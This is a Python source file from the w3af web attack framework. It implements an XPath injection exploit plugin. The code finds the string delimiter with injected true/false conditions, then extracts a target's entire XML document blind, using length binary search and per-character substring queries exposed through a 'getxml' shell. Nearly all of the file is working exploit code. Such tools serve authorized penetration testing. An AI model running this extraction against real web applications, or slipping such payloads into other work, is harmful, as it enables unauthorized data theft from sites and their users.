'''
xpath.py

Copyright 2012 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''

from random import randint
import re
import difflib

from core.data.kb.knowledgeBase import kb
from core.data.parsers.urlParser import url_object

from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
from core.controllers.w3afException import w3afException
import core.controllers.outputManager as om
from core.data.kb.exec_shell import shell as shell


class xpath(baseAttackPlugin):

    def __init__(self):
        baseAttackPlugin.__init__(self)
        
        # User configured parameter
        self._change_to_post = True
        self._url = ''
        self._data = ''
        self._inj_var = ''
        self._method = 'GET'
    
        # Internal variables
        self.use_difflib = None
        self.THRESHOLD = 0.8
        self.rnum = randint(1,100)
        self.err_msg = 'Empty Path Expression'

    def fastExploit( self ):
        '''
        Exploits a web app with osCommanding vuln, the settings are configured using setOptions()
        '''
        raise w3afException('Not implemented.')
    
    def getOptions(self):
        #TODO: Implement this
        return []
    
    def setOptions(self, options):
        #TODO: Implement this
        pass
    
    def getAttackType(self):
        '''
        @return: The type of exploit, SHELL, PROXY, etc.
        '''        
        return 'shell'
    
    def getVulnName2Exploit( self ):
        '''
        This method should return the vulnerability name (as saved in the kb) to exploit.
        For example, if the audit.osCommanding plugin finds an vuln, and saves it as:
        
        kb.kb.append( 'osCommanding' , 'osCommanding', vuln )
        
        Then the exploit plugin that exploits osCommanding ( attack.osCommandingShell ) should
        return 'osCommanding' in this method.
        '''        
        return 'xpath'
                
    def _generateShell(self, vuln):
        '''
        @param vuln: The vulnerability to exploit
        
        @return: A shell object that allows the user to dump
        the full XML using an xpath injection vulnerability.
        '''        
        #
        #    Check if the vulnerability can be exploited using our techniques
        #
        if self._verifyVuln( vuln ):
            #
            #    Generate the shell
            #
            if vuln.getMethod() != 'POST' and self._change_to_post and \
            self._verifyVuln( self.GET2POST( vuln ) ):
                msg = 'The vulnerability was found using method GET, but POST is being used'
                msg += ' during this exploit.'
                om.out.console( msg )
                vuln = self.GET2POST( vuln )
            else:
                msg = 'The vulnerability was found using method GET, tried to change the method to'
                msg += ' POST for exploiting but failed.'
                om.out.console( msg )
            
            # Create the shell object
            shell_obj = xpath_shell( vuln )
            shell_obj.setUrlOpener( self._urlOpener )
            shell_obj.STR_DEL = self.STR_DEL
            shell_obj.TRUE_COND = self.TRUE_COND
            shell_obj.FALSE_COND = self.FALSE_COND
            shell_obj.use_difflib = self.use_difflib  
            return shell_obj
            
        else:
            # FAIL!
            return None
            
    def _verifyVuln(self, vuln):
        '''
        @return: True if the vulnerability can be exploited.
        '''
        #    Check if I should difflib or not during this exploit
        self.use_difflib = self._verifyDifflib(vuln, 10)
        
        #
        #    Create the TRUE and FALSE conditions for the queries using
        #    the correct string delimiter
        #
        delimiter = self._get_delimiter( vuln )
        if delimiter is None:
            return False
        
        self.STR_DEL = delimiter
             
        self.TRUE_COND = "%s and %s%i%s=%s%i" % (self.STR_DEL, self.STR_DEL, 
                                                 self.rnum, self.STR_DEL, 
                                                 self.STR_DEL, self.rnum)
        
        self.FALSE_COND = "%s and %s%i%s=%s%i" % (self.STR_DEL, self.STR_DEL, 
                                                  self.rnum, self.STR_DEL, 
                                                  self.STR_DEL, self.rnum + 1)
        
        exploit_dc = vuln.getDc()
        functionReference = getattr( self._urlOpener , vuln.getMethod() )
        exploit_dc[ vuln.getVar() ] = self.FALSE_COND

        #
        #    Testing False response
        #
        om.out.console( "Testing FALSE response..." )
        try:
            false_resp = functionReference( vuln.getURL(), str(exploit_dc) )
        except w3afException, e:
            return 'Error "' + str(e) + '"'
        else:
            if not self._response_is_error(vuln, false_resp.getBody()):  
                om.out.console( "ERROR: Error message not found in FALSE response..." )
                return False
            else:
                om.out.console( "Error message found in FALSE response GOOD!" )
            #
            #    Now that we know that the FALSE response was correct, test the
            #    TRUE response.
            #
            om.out.console( "Testing TRUE response..." )
            exploit_dc[ vuln.getVar() ] = self.TRUE_COND

            try:
                true_resp = functionReference( vuln.getURL(), str(exploit_dc) )
            except w3afException, e:
                return 'Error "' + str(e)
            else:              
                if self. _response_is_error(vuln, true_resp.getBody()):
                    print true_resp.getBody()
                    om.out.console( "ERROR: Error message found in TRUE response..." )
                    return False
                else:
                    om.out.console( "Error message not found in TRUE response GOOD!" )
                    return True
            
    def _get_delimiter(self, vuln):
        '''
        @return: The delimiter to be used to terminate strings, one of
        single quote or double quote. If an error is found, None is returned.
        '''
        exploit_dc = vuln.getDc()
        functionReference = getattr( self._urlOpener , vuln.getMethod() )
        
        true_sq = "' and '%i'='%i" % (self.rnum, self.rnum)
        false_sq = "' and '%i'='%i" % (self.rnum, self.rnum + 1) 
        true_dq = '" and "%i"="%i' % (self.rnum, self.rnum) 
        
        om.out.console( "Trying to determine string delimiter" )
        om.out.console(  "Testing Single Quote... (')" )
        exploit_dc[ vuln.getVar() ] = true_sq
        try:
            sq_resp = functionReference( vuln.getURL(), str(exploit_dc) )
        except w3afException, e:
            om.out.console( 'Error "' + str(e) + '"' )
            return None
        else:
            if self._response_is_error(vuln, sq_resp.getBody()):
                # If we found ERROR with TRUE Query, we have a problem!
                om.out.console( 'Single Quote TRUE test failed, testing Double quote' )
                exploit_dc[ vuln.getVar() ] = true_dq
                try:
                    dq_resp = functionReference( vuln.getURL(), str(exploit_dc) )
                except w3afException, e:
                    om.out.console( 'Error "' + str(e) + '"' )
                    return None
                else:
                    if self._response_is_error(vuln, dq_resp.getBody()):
                        # If we found an error HERE, the TWO tests were ERROR, 
                        # Houston we have a BIG PROBLEM! 
                        om.out.console( 'The TWO string delimiter tests failed, stopping.' )
                        return None
                    else:
                        om.out.console( 'String delimiter found! It is (")!' )
                        return '"'
            else:
                # If true query was single-quote, test false query.
                exploit_dc[ vuln.getVar() ] = false_sq
                try:
                    sq_resp = functionReference( vuln.getURL(), str(exploit_dc) )
                except w3afException, e:
                    om.out.console( 'Error "' + str(e) + '"' )
                    return None
                else:
                    if self._response_is_error(vuln, sq_resp.getBody()):
                        om.out.console( 'String delimiter FOUND, It is (\')!' )
                        return "'"
                    else:
                        om.out.console( 'The TWO string delimiter tests failed, stopping.' )
                        return None         
                            
    def _response_is_error(self, vuln, res_body):
        '''
        This functions checks which method must be used to check Responses
        
        @return: True if the res_body is ERROR and FALSE if Not
        '''
        exploit_dc = vuln.getDc()
        functionReference = getattr( self._urlOpener , vuln.getMethod() )
        exploit_dc[ vuln.getVar() ] = vuln.getMutant().getOriginalValue()

        if self.use_difflib:
            # TODO: Perform this request only once
            try:     
                baseReq = functionReference( vuln.getURL(), str(exploit_dc) )
            except w3afException, e:
                # TODO: FIX this return
                return 'Error "' + str(e) + '"'
            else:
                if difflib.SequenceMatcher(None, baseReq.getBody(), 
                                           res_body).ratio() < self.THRESHOLD :
                    return True
                else:
                    return False
        else:
            if re.search(self.err_msg, res_body, re.IGNORECASE):
                return True
            else:
                return False


    def _verifyDifflib(self, vuln, count):
        '''
        This function determines if we can use DiffLib to evaluate responses
        If not possible Error base detection will be used.
        
        @return: TRUE if we can use DiffLib and FALSE if not.
        '''
        diffRatio = 0.0
        
        exploit_dc = vuln.getDc()
        functionReference = getattr( self._urlOpener , vuln.getMethod() )
        exploit_dc[ vuln.getVar() ] = vuln.getMutant().getOriginalValue()

        om.out.console( "Testing if body dynamically changes... " )
        try:
            base_res = functionReference( vuln.getURL(), str(exploit_dc) )
            
            for _ in xrange(count):
                req_x = functionReference( vuln.getURL(), str(exploit_dc) )
                diffRatio += difflib.SequenceMatcher(None, base_res.getBody(), 
                                                    req_x.getBody()).ratio()
                                                                         
        except w3afException, e:
            om.out.console( 'Error "' + str(e) + '"' )
        else:
            om.out.console( 'Test finished!' )
            
            if (diffRatio / count) > self.THRESHOLD:
                om.out.console( 'It is possible use difflib for identifying the error response' )
                return True
            else:
                om.out.console( 'Randomness is too high to use difflib, switching to error based detection...' )
                return False
        
class xpath_shell(shell):

    def __init__(self, v):
        shell.__init__(self, v)
        
        self._rOS = 'XML'
        self._rSystem = 'XPATH Query'
        self._rUser = None
        self._rSystemName = None
        self.id = 0
        
        # TODO: Review these HARD-CODED constants
        self.xml_cmd = '//*'
        self.max_data_len = 10000 

    def help( self, command ):
        '''
        Handle the help command.
        '''
        result = []
        result.append('Available commands:')
        result.append('    help                            Display this information')
        result.append('    getxml                          Get the full XML file')        
        result.append('    exit                            Exit the shell session')
        result.append('')
        return '\n'.join(result)
 
    def specific_user_input( self, command ):
        '''
        This method is called when a user writes a command in the shell and hits enter.
        
        Before calling this method, the framework calls the generic_user_input method
        from the shell class.

        @parameter command: The command to handle ( ie. "read", "exec", etc ).
        @return: The result of the command.
        '''
        # Get the command and the parameters
        splist = command.split(' ')
        command = splist[0]
        
        if command.strip() == 'getxml':
            return self.getxml()
        
    def getxml(self):
        '''
        This method executes a command in the remote operating system by
        exploiting the vulnerability.

        @parameter command: The command to handle ( ie. "ls", "whoami", etc ).
        @return: The result of the command.
        '''
        data_len = self._get_data_len()
        if data_len is not None:
            
            try:
                data = self.get_data(data_len)
            except w3afException:
                om.out.console( 'Error found during data extration: "%s"' % w3afException )
                return ''
            else:
                return data

    def _get_data_len(self):
        '''
        @return: The length of the data to retrieve or self.max_data_len if the
        XML is too long. In the case of an error, None is returned.
        '''
        exploit_dc = self.getDc()
        functionReference = getattr( self._urlOpener , self.getMethod() )

        maxl = self.max_data_len
        minl = 1
        
        om.out.console("Finding XML data length...")
        
        fdata_len = False
        while not fdata_len:
            
            mid = (maxl + minl) / 2
            om.out.console( "MAX:%i, MID:%i, MIN:%i" % (maxl, mid, minl) )
            findlen = "%sand string-length(%s)=%i %s" % (self.STR_DEL,
                                                         self.xml_cmd, 
                                                         mid, self.TRUE_COND[1:])
            exploit_dc[ self.getVar() ] = findlen
            
            try:    
                lresp = functionReference( self.getURL(), str(exploit_dc) )
            except w3afException, e:
                om.out.console( 'Error "' + str(e) + '"' )
            else:
                if not self. _response_is_error(self, lresp.getBody()):
                    # We found the length!
                    fdata_len = True
                    om.out.console('Response Length FOUND!: %i ' % (mid) )
                    return mid
                
                else:
                    findlen = "%sand string-length(%s)<%i %s" % (self.STR_DEL,
                                                                 self.xml_cmd, 
                                                                 mid , self.TRUE_COND[1:])
                    try:
                        exploit_dc[ self.getVar() ] = findlen
                        lresp = functionReference( self.getURL(), str(exploit_dc) )
                    except w3afException, e:
                        om.out.console( 'Error "' + str(e) + '"')
                        return None
                    else:
                        if not self._response_is_error(self, lresp.getBody()):
                            # LENGTH IS < THAN MID
                            #print 'Len < %i' % (mid)
                            maxl = mid
                        else:
                            # LENGTH IS > THAN MID
                            #print 'Len > %i' % (mid)
                            minl = mid

    def get_data(self, ldata):
        '''
        @param ldata: The data length to retrieve
        
        @return: A string with the XML data!
        
        HTTP library exceptions are not handled in order to make the code clearer. 
        '''
        exploit_dc = self.getDc()
        functionReference = getattr( self._urlOpener , self.getMethod() )

        data = ''
        
        for pos in range(ldata):
            for c in range(32,127):
                
                hexcar = '%' + hex(c)[2:]
                dataq = '%s and substring(%s,%i,1)="%s" %s' % (self.STR_DEL,
                                                               self.xml_cmd, 
                                                               pos, hexcar, 
                                                               self.TRUE_COND[1:])
                exploit_dc[ self.getVar() ] = dataq
                dresp = functionReference( self.getURL(), str(exploit_dc) )
                
                if not self._response_is_error(self, dresp.getBody()):
                    data += chr(c)
                    
        return data
            
    def end( self ):
        om.out.debug('xpath_shell cleanup complete.')
        
    def getName( self ):
        return 'xpath_shell'
        
